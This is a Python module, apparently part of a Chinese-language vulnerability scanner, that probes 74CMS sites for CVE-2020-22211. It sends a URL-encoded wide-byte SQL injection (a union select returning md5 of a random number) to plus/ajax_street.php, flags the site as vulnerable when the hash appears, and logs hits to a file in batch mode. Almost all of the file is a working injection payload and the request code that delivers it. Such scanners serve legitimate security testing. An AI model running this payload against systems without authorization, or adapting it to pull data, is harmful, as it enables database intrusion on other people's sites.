import requests,re,urllib3
from hashlib import md5
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Cve_2020_22211:
	def randomInt(self,s,e):
		import random
		key=random.randint(int(s),int(e))
		return key

	def scan(self,baseurl):
		rand = self.randomInt(100000, 200000)
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"plus/ajax_street.php?act=key&key=%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5("+str(rand)+"),9%23"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=5,verify=self.ssl,proxies=self.proxy)
		if response.status_code == 200 and md5(str(rand).encode()).hexdigest() in response.text:
			OutPrintInfo("74CMS",f"存在CVE-2020-22211漏洞: {url}")
			if self.batch:
				OutPutFile("74cms_2020_22211.txt",f"存在CVE-2020-22211漏洞: {url}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "目标不存在CVE-2020-22211漏洞")
	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("74CMS", "开始检测CVE-2020-22211...")
		self.scan(url)
		if not self.batch:
			OutPrintInfo("74CMS", "CVE-2020-22211检测结束")
